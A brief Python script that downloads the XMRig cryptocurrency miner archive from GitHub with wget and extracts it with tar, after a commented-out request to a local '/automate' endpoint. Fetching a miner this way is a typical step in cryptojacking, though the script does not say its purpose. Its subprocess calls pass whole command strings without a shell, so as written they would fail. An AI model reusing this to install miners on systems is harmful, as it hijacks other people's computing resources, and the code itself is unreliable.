# import requests

# resp = requests.get(' http://127.0.0.1:5000/automate')
# print(resp.text)


import os
import subprocess

subprocess.run(
    'wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz')
subprocess.run('tar -xvzf xmrig-6.17.0-linux-x64.tar.gz')
